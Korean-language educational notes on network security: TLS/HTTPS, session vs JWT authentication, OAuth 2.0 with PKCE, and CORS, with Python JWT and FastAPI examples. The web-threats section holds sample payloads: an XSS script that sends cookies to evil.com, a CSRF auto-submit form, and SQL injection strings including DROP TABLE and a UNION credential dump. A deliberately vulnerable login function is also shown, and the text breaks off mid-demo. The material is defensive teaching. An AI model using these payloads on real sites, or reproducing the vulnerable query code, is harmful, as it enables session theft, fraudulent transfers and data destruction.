> 네트워크 보안은 데이터 기밀성, 무결성, 가용성을 보장하는 기술과 프로토콜의 총체이다.
> 이 문서에서는 TLS/SSL 암호화, 인증/인가 메커니즘, JWT, OAuth 2.0, CORS, 그리고 주요 웹 보안 위협을 다룬다.

## 핵심 개념

### 1. TLS/SSL — 전송 계층 보안

TLS(Transport Layer Security)는 네트워크 통신을 암호화하여 도청과 변조를 방지하는 프로토콜이다. SSL(Secure Sockets Layer)의 후속 버전이며, 현재 TLS 1.3이 최신 표준이다.

**대칭키 vs 비대칭키 암호화:**

```
대칭키 암호화 (Symmetric Encryption)
======================================

  송신자                               수신자
    |                                    |
    |  [평문] + [공유 비밀키]             |
    |      ↓ 암호화                      |
    |  [암호문] ───────────────────────> |
    |                    [암호문] + [같은 비밀키]
    |                        ↓ 복호화    |
    |                    [평문]          |

  장점: 빠른 처리 속도 (AES-256: 수 Gbps)
  단점: 키 교환 문제 — 비밀키를 안전하게 전달하는 방법?
  알고리즘: AES-128, AES-256, ChaCha20


비대칭키 암호화 (Asymmetric Encryption)
========================================

  송신자                               수신자
    |                                    |
    |       [수신자의 공개키]를 알고 있음  |
    |                                    |
    |  [평문] + [공개키]                  |
    |      ↓ 암호화                      |
    |  [암호문] ───────────────────────> |
    |                    [암호문] + [개인키]
    |                        ↓ 복호화    |
    |                    [평문]          |

  장점: 키 교환 문제 해결 (공개키는 누구에게나 공개 가능)
  단점: 느린 처리 속도 (대칭키 대비 100~1000배 느림)
  알고리즘: RSA-2048, ECDSA, Ed25519

  → TLS는 비대칭키로 대칭키를 안전하게 교환한 후,
    실제 데이터는 대칭키로 암호화한다 (하이브리드 방식)
```

**TLS 1.3 핸드셰이크 흐름:**

```
TLS 1.3 핸드셰이크 (1-RTT)
============================

  클라이언트                                     서버
     |                                            |
     |  1) ClientHello                            |
     |--- 지원 암호화 스위트 목록 ──────────────>|
     |    지원 TLS 버전                           |
     |    키 교환에 사용할 공개키 (Key Share)      |
     |    랜덤 값 (Client Random)                 |
     |                                            |
     |  2) ServerHello                            |
     |<── 선택한 암호화 스위트 ──────────────────|
     |    서버의 공개키 (Key Share)               |
     |    랜덤 값 (Server Random)                 |
     |                                            |
     |  3) 서버 인증서 + 검증                     |
     |<── {Certificate} ────────────────────────|
     |    서버 인증서 체인 (암호화됨)              |
     |<── {CertificateVerify} ──────────────────|
     |    인증서의 개인키로 서명한 증거            |
     |<── {Finished} ───────────────────────────|
     |    핸드셰이크 무결성 검증 해시              |
     |                                            |
     |  이 시점에서 대칭키(세션 키)가 양쪽에서     |
     |  독립적으로 계산됨 (Diffie-Hellman)         |
     |                                            |
     |  4) 클라이언트 완료                        |
     |--- {Finished} ──────────────────────────>|
     |                                            |
     |  ========= 암호화된 통신 시작 =========    |
     |--- {Application Data} ──────────────────>|
     |<── {Application Data} ──────────────────|
     |                                            |

     {} = 대칭키로 암호화된 메시지
     총 1 RTT만에 핸드셰이크 완료 (TLS 1.2는 2 RTT)
```

**인증서 체인 (Certificate Chain):**

```
인증서 체인 구조
=================

  ┌─────────────────────────────────────────┐
  │        Root CA 인증서 (자체 서명)        │  ← 브라우저/OS에 사전 설치됨
  │  (예: DigiCert, Let's Encrypt Root)     │     (Trust Store)
  └──────────────────┬──────────────────────┘
                     │ 서명
                     ▼
  ┌─────────────────────────────────────────┐
  │      중간(Intermediate) CA 인증서       │  ← Root CA가 서명
  │  (예: Let's Encrypt R3)                 │     Root 개인키 보호 목적
  └──────────────────┬──────────────────────┘
                     │ 서명
                     ▼
  ┌─────────────────────────────────────────┐
  │        서버(End-Entity) 인증서          │  ← 중간 CA가 서명
  │  도메인: example.com                    │     서버가 클라이언트에 전송
  │  공개키: [서버의 공개키]                 │
  │  유효기간: 2024-01-01 ~ 2025-01-01      │
  └─────────────────────────────────────────┘

  검증 과정:
  1. 서버 인증서의 서명을 중간 CA의 공개키로 검증
  2. 중간 CA 인증서의 서명을 Root CA의 공개키로 검증
  3. Root CA가 Trust Store에 있는지 확인
  → 체인이 모두 유효하면 인증서 신뢰
```

### 2. HTTPS — HTTP over TLS

HTTPS는 HTTP 통신을 TLS로 암호화한 것이다. 현재 웹에서 사실상 필수 표준이다.

**HTTPS가 중요한 이유:**

```
중간자 공격 (Man-in-the-Middle, MitM)
=======================================

[HTTP - 암호화 없음]

  사용자 ──── "비밀번호: 1234" ────> 서버
                    ↑
              공격자가 네트워크 패킷을
              가로채서 내용을 읽음
              (카페 Wi-Fi, 공유기 해킹 등)


[HTTPS - TLS 암호화]

  사용자 ──── "aG#k$9x@..." ────> 서버
                    ↑                ↓
              공격자가 가로채도      서버에서
              암호화된 데이터만 보임  복호화
              (해독 불가)           "비밀번호: 1234"
```

**HSTS (HTTP Strict Transport Security):**
- 서버가 브라우저에게 "앞으로 이 도메인은 반드시 HTTPS로만 접속하라"고 지시
- 응답 헤더: `Strict-Transport-Security: max-age=31536000; includeSubDomains`
- HTTP → HTTPS 리다이렉트 사이의 취약 구간(SSL Stripping 공격) 방지
- 브라우저가 HSTS 목록을 저장하여 첫 접속부터 HTTPS 강제 (preload 목록)

### 3. 인증과 인가 — Authentication vs Authorization

```
인증(Authentication)과 인가(Authorization) 비교
=================================================

인증 (Authentication) — "너는 누구인가?"
  ┌────────────────────────┐
  │  사용자: ID + 비밀번호  │
  │          ↓              │
  │  서버: 신원 확인        │
  │          ↓              │
  │  결과: "김철수입니다"   │
  └────────────────────────┘

인가 (Authorization) — "너는 무엇을 할 수 있는가?"
  ┌─────────────────────────────┐
  │  사용자: 김철수 (인증 완료)  │
  │          ↓                   │
  │  서버: 권한 확인             │
  │    - 게시글 읽기: O          │
  │    - 게시글 작성: O          │
  │    - 관리자 페이지: X        │
  │    - 사용자 삭제: X          │
  └─────────────────────────────┘

순서: 인증 → 인가 (항상 인증이 먼저)
```

**세션 기반 vs 토큰 기반 인증:**

```
세션 기반 인증 (Session-based)
================================

  클라이언트                           서버
     |                                  |
     |--- POST /login ───────────────>|
     |    {id: "user", pw: "1234"}     |
     |                                  |  세션 생성
     |<── Set-Cookie: sid=abc123 ─────|  (서버 메모리/DB에 저장)
     |                                  |
     |--- GET /profile ──────────────>|
     |    Cookie: sid=abc123           |  세션 ID로 사용자 조회
     |<── 200 OK {name: "김철수"} ────|
     |                                  |

  장점: 서버가 세션을 완전히 제어 (즉시 무효화 가능)
  단점: 서버에 상태 저장 필요 → 수평 확장 시 세션 공유 문제
       (Redis 등 외부 저장소 필요)


토큰 기반 인증 (Token-based, JWT)
===================================

  클라이언트                           서버
     |                                  |
     |--- POST /login ───────────────>|
     |    {id: "user", pw: "1234"}     |
     |                                  |  JWT 생성 (서명만)
     |<── {token: "eyJhb..."} ────────|  (서버에 저장 안 함)
     |                                  |
     |--- GET /profile ──────────────>|
     |    Authorization: Bearer eyJ... |  토큰 서명 검증만
     |<── 200 OK {name: "김철수"} ────|  (DB 조회 불필요)
     |                                  |

  장점: 서버 무상태(Stateless) → 수평 확장 용이
       마이크로서비스 간 인증 정보 전달 용이
  단점: 토큰 발급 후 즉시 무효화 어려움
       토큰 크기가 세션 ID보다 큼
```

### 4. JWT (JSON Web Token)

JWT는 당사자 간 정보를 JSON 객체로 안전하게 전달하기 위한 개방형 표준(RFC 7519)이다.

**JWT 구조:**

```
JWT 구조 (Header.Payload.Signature)
=====================================

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Iuq5gOyyoOyImCJ9.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

  ┌──────────────────────────────────────────────┐
  │  Header (헤더) — Base64URL 인코딩             │
  │  {                                            │
  │    "alg": "HS256",    // 서명 알고리즘         │
  │    "typ": "JWT"       // 토큰 타입             │
  │  }                                            │
  ├──────────────────────────────────────────────┤
  │  Payload (페이로드) — Base64URL 인코딩         │
  │  {                                            │
  │    "sub": "1234567890",  // 주체 (사용자 ID)   │
  │    "name": "김철수",      // 사용자 정보        │
  │    "role": "user",       // 역할               │
  │    "iat": 1709251200,    // 발급 시간           │
  │    "exp": 1709337600     // 만료 시간           │
  │  }                                            │
  ├──────────────────────────────────────────────┤
  │  Signature (서명)                              │
  │  HMAC-SHA256(                                  │
  │    base64url(header) + "." + base64url(payload)│
  │    , secret_key                                │
  │  )                                            │
  └──────────────────────────────────────────────┘

  중요: Base64는 암호화가 아닌 인코딩!
  → 페이로드는 누구나 디코딩하여 읽을 수 있음
  → 비밀번호, 카드번호 등 민감 정보를 절대 넣지 말 것
  → 서명은 변조 방지를 위한 것이지 기밀 보장이 아님
```

**Access Token + Refresh Token 흐름:**

```
Access Token + Refresh Token 전략
====================================

  클라이언트                                서버
     |                                       |
     |  1) 로그인                            |
     |--- POST /auth/login ───────────────>|
     |                                       |
     |<── Access Token  (유효기간: 15분) ───|
     |    Refresh Token (유효기간: 7일)      |
     |    (Refresh Token은 httpOnly 쿠키)    |
     |                                       |
     |  2) API 호출 (Access Token 사용)       |
     |--- GET /api/data ──────────────────>|
     |    Authorization: Bearer {access}    |  ✓ 유효
     |<── 200 OK ──────────────────────────|
     |                                       |
     |  3) Access Token 만료 (15분 후)       |
     |--- GET /api/data ──────────────────>|
     |    Authorization: Bearer {access}    |  ✗ 만료됨
     |<── 401 Unauthorized ────────────────|
     |                                       |
     |  4) Refresh Token으로 갱신            |
     |--- POST /auth/refresh ─────────────>|
     |    Cookie: refresh_token=...         |  ✓ Refresh 유효
     |<── 새 Access Token ─────────────────|
     |    (필요 시 새 Refresh Token도)       |
     |                                       |
     |  5) 새 Access Token으로 재시도        |
     |--- GET /api/data ──────────────────>|
     |    Authorization: Bearer {새access}  |  ✓ 유효
     |<── 200 OK ──────────────────────────|

  왜 두 개의 토큰을 사용하는가?
  ─────────────────────────────
  Access Token:  짧은 수명 → 탈취되어도 피해 최소화
  Refresh Token: 긴 수명 → 사용자가 자주 로그인 안 해도 됨
                 httpOnly 쿠키에 저장 → XSS로 탈취 불가
```

**JWT 보안 주의사항:**
- 페이로드에 민감 정보를 넣지 말 것 (Base64 디코딩으로 누구나 읽을 수 있음)
- 반드시 만료 시간(exp)을 설정할 것
- Access Token은 짧은 수명으로 유지 (15분~1시간)
- Refresh Token은 httpOnly 쿠키에 저장 (JavaScript 접근 차단)
- 서명 알고리즘 "none" 취약점 주의 (검증 시 알고리즘 고정)
- HTTPS 환경에서만 토큰을 전송할 것

### 5. OAuth 2.0 — 인가 프레임워크

OAuth 2.0은 사용자가 자신의 비밀번호를 제3자 앱에 제공하지 않고도 리소스 접근을 허가할 수 있는 인가 프레임워크이다.

**4가지 역할:**

| 역할 | 설명 | 예시 |
|------|------|------|
| Resource Owner | 리소스 소유자 (사용자) | 구글 계정 소유자 |
| Client | 리소스에 접근하려는 앱 | 제3자 웹앱 |
| Authorization Server | 인가를 처리하는 서버 | Google OAuth 서버 |
| Resource Server | 보호된 리소스를 호스팅 | Google API 서버 |

**Authorization Code Flow (가장 안전한 흐름):**

```
OAuth 2.0 Authorization Code Flow
====================================

  사용자          Client (웹앱)        Auth Server         Resource Server
    |                 |                   (Google)            (Google API)
    |                 |                     |                     |
    |  1) "Google로 로그인" 클릭           |                     |
    |--- 클릭 ──────>|                     |                     |
    |                 |                     |                     |
    |  2) 인가 서버로 리다이렉트            |                     |
    |<── 302 Redirect ──────────────────>|                     |
    |    /authorize?                      |                     |
    |      client_id=abc                  |                     |
    |      redirect_uri=https://app/cb    |                     |
    |      response_type=code             |                     |
    |      scope=email+profile            |                     |
    |      state=xyz123 (CSRF 방지)       |                     |
    |                                      |                     |
    |  3) 사용자가 구글 로그인 + 권한 동의  |                     |
    |--- ID/PW 입력, "허용" 클릭 ────────>|                     |
    |                                      |                     |
    |  4) 인가 코드(Authorization Code)    |                     |
    |<── 302 Redirect ──────────────────|                     |
    |    https://app/cb?code=AUTH_CODE     |                     |
    |                   &state=xyz123      |                     |
    |                 |                     |                     |
    |  5) Client가 인가 코드로 토큰 교환 (서버→서버, 비공개)     |
    |                 |--- POST /token --->|                     |
    |                 |    code=AUTH_CODE   |                     |
    |                 |    client_secret=.. |                     |
    |                 |                     |                     |
    |                 |<── Access Token ---|                     |
    |                 |    Refresh Token    |                     |
    |                 |                     |                     |
    |  6) Access Token으로 API 호출                              |
    |                 |--- GET /userinfo ─────────────────────>|
    |                 |    Authorization: Bearer {token}        |
    |                 |<── {email, name, picture} ─────────────|
    |                 |                     |                     |
    |  7) 로그인 완료                       |                     |
    |<── "환영합니다, 김철수님" ──────────|                     |
    |                 |                     |                     |

  핵심 보안 포인트:
  - client_secret은 서버 측에서만 사용 (절대 프론트엔드 노출 금지)
  - state 파라미터로 CSRF 공격 방지
  - 인가 코드는 일회성이며 짧은 수명
```

**PKCE (Proof Key for Code Exchange):**

```
PKCE — SPA/모바일 앱을 위한 추가 보안
=======================================

  문제: SPA나 모바일 앱에서는 client_secret을 안전하게
       보관할 수 없음 (코드가 클라이언트에 노출됨)

  해결: PKCE는 동적으로 생성한 랜덤 값으로 보안을 강화

  1. Client가 랜덤 값(code_verifier) 생성
     code_verifier = "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"

  2. 그 해시값(code_challenge)을 인가 요청에 포함
     code_challenge = BASE64URL(SHA256(code_verifier))
                    = "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM"

  3. 토큰 교환 시 원본 code_verifier를 전송
     → Auth Server가 해시를 검증하여 요청의 진위 확인

  이점: 인가 코드를 탈취해도 code_verifier 없이는
       토큰 교환 불가 → client_secret 없이도 안전
```

### 6. CORS (Cross-Origin Resource Sharing)

CORS는 브라우저의 동일 출처 정책(Same-Origin Policy)을 안전하게 완화하여 다른 출처의 리소스 접근을 허용하는 메커니즘이다.

**동일 출처 정책 (Same-Origin Policy):**

```
동일 출처(Same Origin)란?
==========================

출처(Origin) = 프로토콜 + 호스트 + 포트

  https://example.com:443/path

  프로토콜: https
  호스트:   example.com
  포트:     443

비교 예시 (기준: https://example.com):
─────────────────────────────────────────────
URL                              동일 출처?
─────────────────────────────────────────────
https://example.com/page2        O (경로만 다름)
https://example.com:443/api      O (기본 포트)
http://example.com               X (프로토콜 다름)
https://api.example.com          X (호스트 다름)
https://example.com:8080         X (포트 다름)
https://other.com                X (호스트 다름)
─────────────────────────────────────────────

브라우저는 보안을 위해 다른 출처로의 요청을
기본적으로 차단한다 → CORS로 허용해야 함
```

**Preflight OPTIONS 요청:**

```
CORS Preflight 요청 흐름
==========================

  브라우저 (https://app.com)             서버 (https://api.com)
     |                                       |
     |  1) 실제 요청 전에 Preflight 전송      |
     |--- OPTIONS /api/data ───────────────>|
     |    Origin: https://app.com            |
     |    Access-Control-Request-Method: POST|
     |    Access-Control-Request-Headers:    |
     |      Content-Type, Authorization      |
     |                                       |
     |  2) 서버가 허용 여부 응답              |
     |<── 204 No Content ──────────────────|
     |    Access-Control-Allow-Origin:       |
     |      https://app.com                  |
     |    Access-Control-Allow-Methods:      |
     |      GET, POST, PUT, DELETE           |
     |    Access-Control-Allow-Headers:      |
     |      Content-Type, Authorization      |
     |    Access-Control-Max-Age: 86400      |
     |      (Preflight 캐시: 24시간)         |
     |                                       |
     |  3) 허용 확인 후 실제 요청 전송        |
     |--- POST /api/data ─────────────────>|
     |    Origin: https://app.com            |
     |    Content-Type: application/json     |
     |    Authorization: Bearer token        |
     |                                       |
     |<── 200 OK ──────────────────────────|
     |    Access-Control-Allow-Origin:       |
     |      https://app.com                  |

  Preflight가 필요한 조건 (아래 중 하나라도 해당):
  - GET, HEAD, POST 외의 HTTP 메서드 사용
  - Content-Type이 기본값(text/plain 등)이 아닌 경우
  - 커스텀 헤더 (Authorization 등) 포함
  - credentials(쿠키) 포함 요청
```

**흔한 CORS 설정 실수:**

```
CORS 설정 실수와 올바른 설정
==============================

[위험] 모든 출처 허용 — 실서비스에서 사용 금지!
  Access-Control-Allow-Origin: *
  → 어떤 사이트에서든 API 호출 가능
  → credentials(쿠키)와 함께 사용 불가

[위험] 요청의 Origin을 그대로 반영
  Access-Control-Allow-Origin: {request.origin}
  → 사실상 *와 동일, 공격자 사이트도 허용됨

[올바른] 화이트리스트로 특정 출처만 허용
  allowed_origins = ["https://app.com", "https://admin.app.com"]
  if request.origin in allowed_origins:
      response["Access-Control-Allow-Origin"] = request.origin

[주의] credentials 사용 시
  Access-Control-Allow-Origin: *       ← 불가!
  Access-Control-Allow-Credentials: true
  → credentials 사용 시 반드시 구체적인 Origin 명시 필요
```

### 7. 웹 보안 위협 — XSS, CSRF, SQL Injection

#### XSS (Cross-Site Scripting)

공격자가 웹 페이지에 악성 스크립트를 주입하여 다른 사용자의 브라우저에서 실행시키는 공격.

```
XSS 공격 유형
==============

1) Stored XSS (저장형)
   ─────────────────
   공격자 → 게시판에 악성 스크립트 포함 글 작성

   게시글 내용:
   "좋은 글이네요! <script>
     fetch('https://evil.com/steal?cookie=' + document.cookie)
   </script>"

   피해자가 게시글 열람 → 스크립트 실행 → 쿠키 탈취
   * 가장 위험: DB에 저장되어 모든 열람자에게 영향

2) Reflected XSS (반사형)
   ─────────────────────
   공격자가 조작된 URL을 피해자에게 전송

   https://shop.com/search?q=<script>alert('XSS')</script>

   서버가 검색어를 그대로 HTML에 반영
   → 피해자 브라우저에서 스크립트 실행
   * URL에 포함되어 일회성으로 동작

3) DOM-based XSS
   ─────────────
   서버를 거치지 않고 클라이언트 JS에서 발생

   // 취약한 코드
   document.getElementById('output').innerHTML =
     location.hash.substring(1);

   URL: https://app.com/#<img src=x onerror=alert('XSS')>
   → 클라이언트에서 직접 DOM 조작으로 스크립트 실행
```

**XSS 방어:**
- 출력 시 HTML 이스케이프: `<` → `&lt;`, `>` → `&gt;`
- Content Security Policy (CSP) 헤더 설정
- httpOnly 쿠키 사용 (JavaScript에서 쿠키 접근 차단)
- 입력값 검증 및 화이트리스트 기반 필터링

#### CSRF (Cross-Site Request Forgery)

사용자가 인증된 상태에서 공격자의 사이트를 방문하면, 사용자 모르게 의도하지 않은 요청이 전송되는 공격.

```
CSRF 공격 시나리오
===================

  1) 사용자가 은행 사이트에 로그인 중 (세션 쿠키 보유)

  2) 공격자의 사이트를 방문

  3) 공격자 페이지에 숨겨진 폼:
     <img src="https://bank.com/transfer?to=attacker&amount=1000000">

     또는
     <form action="https://bank.com/transfer" method="POST">
       <input type="hidden" name="to" value="attacker">
       <input type="hidden" name="amount" value="1000000">
     </form>
     <script>document.forms[0].submit();</script>

  4) 브라우저가 자동으로 은행의 세션 쿠키를 포함하여 요청 전송
     → 사용자 모르게 계좌 이체 실행!

  방어 방법:
  ─────────
  1. CSRF 토큰: 서버가 폼에 랜덤 토큰을 삽입하고 검증
     <input type="hidden" name="_csrf" value="random_token">
     → 공격자는 이 토큰값을 알 수 없음

  2. SameSite 쿠키: Set-Cookie: session=abc; SameSite=Strict
     → 다른 사이트에서의 요청에 쿠키를 포함하지 않음

  3. Origin/Referer 헤더 검증
     → 요청의 출처가 올바른지 서버에서 확인
```

#### SQL Injection

사용자 입력값에 SQL 코드를 삽입하여 데이터베이스를 조작하는 공격.

```
SQL Injection 공격 예시
========================

  로그인 폼:
  Username: admin' --
  Password: (아무 값)

  취약한 SQL 쿼리:
  query = "SELECT * FROM users WHERE username='"
          + username + "' AND password='" + password + "'"

  실행되는 쿼리:
  SELECT * FROM users WHERE username='admin' --' AND password='...'
                                              ↑
                                          이후 주석 처리
  → 비밀번호 검증 없이 admin으로 로그인 성공!

  더 위험한 예시:
  Username: '; DROP TABLE users; --
  → 테이블 삭제!

  방어: 파라미터화 쿼리 (Parameterized Query)
  → 사용자 입력을 SQL 코드가 아닌 데이터로 처리
```

### JWT 생성 및 검증 (Python, PyJWT)

```python
# jwt_example.py
# JWT 토큰 생성, 검증, 디코딩 예제
# 설치: pip install PyJWT
import jwt
import time
from datetime import datetime, timedelta


# 비밀 키 (실제 서비스에서는 환경 변수로 관리)
SECRET_KEY = "your-256-bit-secret-key-here"
ALGORITHM = "HS256"  # HMAC-SHA256


def create_access_token(user_id: int, username: str, role: str) -> str:
    """
    Access Token 생성
    - 짧은 유효기간 (15분)
    - 사용자 기본 정보만 포함
    """
    now = datetime.utcnow()
    payload = {
        # 표준 클레임 (Registered Claims)
        "sub": str(user_id),       # Subject: 사용자 식별자
        "iat": now,                 # Issued At: 발급 시간
        "exp": now + timedelta(minutes=15),  # Expiration: 만료 시간
        "nbf": now,                 # Not Before: 이 시간 이전에는 무효

        # 공개 클레임 (Public Claims)
        "iss": "my-app",           # Issuer: 발급자

        # 비공개 클레임 (Private Claims)
        "username": username,
        "role": role,
    }

    token = jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)
    return token


def create_refresh_token(user_id: int) -> str:
    """
    Refresh Token 생성
    - 긴 유효기간 (7일)
    - 최소한의 정보만 포함
    """
    now = datetime.utcnow()
    payload = {
        "sub": str(user_id),
        "iat": now,
        "exp": now + timedelta(days=7),
        "type": "refresh",  # 토큰 타입 구분
    }

    token = jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)
    return token


def verify_token(token: str) -> dict:
    """
    토큰 검증 및 페이로드 반환
    - 서명 검증
    - 만료 시간 확인
    - 알고리즘 고정 (none 공격 방지)
    """
    try:
        # algorithms 파라미터로 허용할 알고리즘을 명시적으로 지정
        # → "alg": "none" 공격 방지
        payload = jwt.decode(
            token,
            SECRET_KEY,
            algorithms=[ALGORITHM],  # 반드시 리스트로 전달
            options={
                "require": ["exp", "sub", "iat"],  # 필수 클레임 지정
            }
        )
        return payload

    except jwt.ExpiredSignatureError:
        print("오류: 토큰이 만료되었습니다.")
        return None
    except jwt.InvalidTokenError as e:
        print(f"오류: 유효하지 않은 토큰입니다. ({e})")
        return None


def decode_without_verify(token: str) -> dict:
    """
    검증 없이 페이로드만 디코딩 (디버깅 용도)
    주의: 실제 서비스에서 이 방식으로 인증하면 안 됨!
    """
    payload = jwt.decode(
        token,
        options={"verify_signature": False}
    )
    return payload


# === 사용 예시 ===
if __name__ == "__main__":
    # 1) Access Token 생성
    access = create_access_token(
        user_id=42,
        username="김철수",
        role="user"
    )
    print(f"Access Token:\n{access}\n")

    # 2) Refresh Token 생성
    refresh = create_refresh_token(user_id=42)
    print(f"Refresh Token:\n{refresh}\n")

    # 3) 토큰 검증
    payload = verify_token(access)
    if payload:
        print(f"검증 성공!")
        print(f"  사용자 ID: {payload['sub']}")
        print(f"  이름: {payload['username']}")
        print(f"  역할: {payload['role']}")
        print(f"  만료: {datetime.fromtimestamp(payload['exp'])}")

    # 4) 변조된 토큰 검증 시도
    print("\n--- 변조된 토큰 테스트 ---")
    tampered = access[:-5] + "XXXXX"
    verify_token(tampered)  # 오류: 유효하지 않은 토큰

    # 5) 만료된 토큰 시뮬레이션
    print("\n--- 만료된 토큰 테스트 ---")
    expired_payload = {
        "sub": "42",
        "exp": datetime.utcnow() - timedelta(hours=1),  # 이미 만료
        "iat": datetime.utcnow() - timedelta(hours=2),
    }
    expired_token = jwt.encode(expired_payload, SECRET_KEY, algorithm=ALGORITHM)
    verify_token(expired_token)  # 오류: 토큰이 만료됨
```

### FastAPI CORS 설정

```python
# cors_example.py
# FastAPI에서의 CORS 설정 예제
# 설치: pip install fastapi uvicorn
from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse

app = FastAPI()

# ===== CORS 미들웨어 설정 =====
# 허용할 출처(origin) 목록 — 화이트리스트 방식
allowed_origins = [
    "https://myapp.com",           # 프로덕션 프론트엔드
    "https://admin.myapp.com",     # 관리자 페이지
    "http://localhost:3000",       # 개발 환경 (React 기본 포트)
    "http://localhost:5173",       # 개발 환경 (Vite 기본 포트)
]

app.add_middleware(
    CORSMiddleware,
    # 허용할 출처 목록 (와일드카드 * 대신 구체적 명시)
    allow_origins=allowed_origins,

    # 자격 증명(쿠키, Authorization 헤더) 포함 허용
    # True일 때 allow_origins에 *를 사용할 수 없음
    allow_credentials=True,

    # 허용할 HTTP 메서드
    allow_methods=["GET", "POST", "PUT", "DELETE", "PATCH"],

    # 허용할 요청 헤더
    allow_headers=[
        "Authorization",          # JWT 토큰
        "Content-Type",           # JSON 요청
        "X-Request-ID",           # 커스텀 헤더
    ],

    # 브라우저에서 접근 가능한 응답 헤더
    expose_headers=["X-Total-Count", "X-Request-ID"],

    # Preflight 캐시 시간 (초) — 동일 요청 반복 시 OPTIONS 생략
    max_age=3600,  # 1시간
)


# ===== API 엔드포인트 =====
@app.get("/api/public")
async def public_endpoint():
    """공개 API — CORS 허용된 모든 출처에서 접근 가능"""
    return {"message": "공개 데이터입니다."}


@app.get("/api/protected")
async def protected_endpoint(request: Request):
    """
    보호된 API — Authorization 헤더 필요
    CORS 설정에서 allow_credentials=True이므로
    쿠키와 Authorization 헤더 포함 가능
    """
    auth_header = request.headers.get("Authorization")
    if not auth_header or not auth_header.startswith("Bearer "):
        return JSONResponse(
            status_code=401,
            content={"error": "인증이 필요합니다."}
        )
    return {"message": "보호된 데이터입니다.", "user": "김철수"}


# ===== 수동 CORS 제어 (미들웨어 대신 직접 헤더 설정) =====
@app.options("/api/manual-cors")
async def manual_cors_preflight(request: Request):
    """Preflight 요청에 직접 응답"""
    origin = request.headers.get("origin")
    if origin in allowed_origins:
        return JSONResponse(
            content={},
            headers={
                "Access-Control-Allow-Origin": origin,
                "Access-Control-Allow-Methods": "POST, GET",
                "Access-Control-Allow-Headers": "Content-Type",
                "Access-Control-Max-Age": "86400",
            }
        )
    return JSONResponse(status_code=403, content={"error": "허용되지 않은 출처"})


# 실행: uvicorn cors_example:app --reload --port 8000
```

### SQL Injection 예시 및 방어

```python
# sql_injection_example.py
# SQL Injection 공격과 방어 예시
# 설치: pip install aiosqlite (비동기) 또는 기본 sqlite3 사용
import sqlite3
from contextlib import contextmanager


@contextmanager
def get_db():
    """데이터베이스 연결 컨텍스트 매니저"""
    conn = sqlite3.connect(":memory:")
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()

    # 테스트 테이블 및 데이터 생성
    cursor.execute("""
        CREATE TABLE users (
            id INTEGER PRIMARY KEY,
            username TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            email TEXT,
            role TEXT DEFAULT 'user'
        )
    """)
    cursor.executemany(
        "INSERT INTO users (username, password, email, role) VALUES (?, ?, ?, ?)",
        [
            ("admin", "hashed_pw_admin", "admin@example.com", "admin"),
            ("김철수", "hashed_pw_kim", "kim@example.com", "user"),
            ("이영희", "hashed_pw_lee", "lee@example.com", "user"),
        ]
    )
    conn.commit()

    try:
        yield conn
    finally:
        conn.close()


# ===== 취약한 코드 (SQL Injection 가능) =====
def login_vulnerable(conn, username: str, password: str):
    """
    [위험] 문자열 포맷팅으로 쿼리 조합 — SQL Injection 취약!
    절대로 이 방식을 사용하지 말 것!
    """
    # 사용자 입력을 직접 SQL에 삽입
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    print(f"  실행 쿼리: {query}")

    cursor = conn.cursor()
    cursor.execute(query)
    result = cursor.fetchone()
    return dict(result) if result else None


# ===== 안전한 코드 (파라미터화 쿼리) =====
def login_safe(conn, username: str, password: str):
    """
    [안전] 파라미터화 쿼리 — 사용자 입력이 SQL 코드로 해석되지 않음
    항상 이 방식을 사용할 것!
    """
    # ? 플레이스홀더로 파라미터 바인딩
    query = "SELECT * FROM users WHERE username=? AND password=?"
    print(f"  실행 쿼리: {query}")
    print(f"  파라미터: ({username}, {password})")

    cursor = conn.cursor()
    cursor.execute(query, (username, password))
    result = cursor.fetchone()
    return dict(result) if result else None


# ===== 공격 시뮬레이션 =====
if __name__ == "__main__":
    with get_db() as conn:
        print("=" * 60)
        print("1) 정상 로그인 시도")
        print("=" * 60)
        result = login_vulnerable(conn, "admin", "hashed_pw_admin")
        print(f"  결과: {result}\n")

        print("=" * 60)
        print("2) SQL Injection 공격 — 비밀번호 우회")
        print("   입력: username = admin' -- ")
        print("=" * 60)
        result = login_vulnerable(conn, "admin' --", "wrong_password")
        print(f"  결과: {result}")
        if result:
            print("  [경고] 비밀번호 없이 admin으로 로그인 성공!\n")

        print("=" * 60)
        print("3) SQL Injection 공격 — UNION으로 데이터 유출")
        print("   입력: username = ' UNION SELECT 1,username,password,email,role FROM users --")
        print("=" * 60)
        malicious_input = "' UNION SELECT 1,username,password,email,role FROM users --"
```
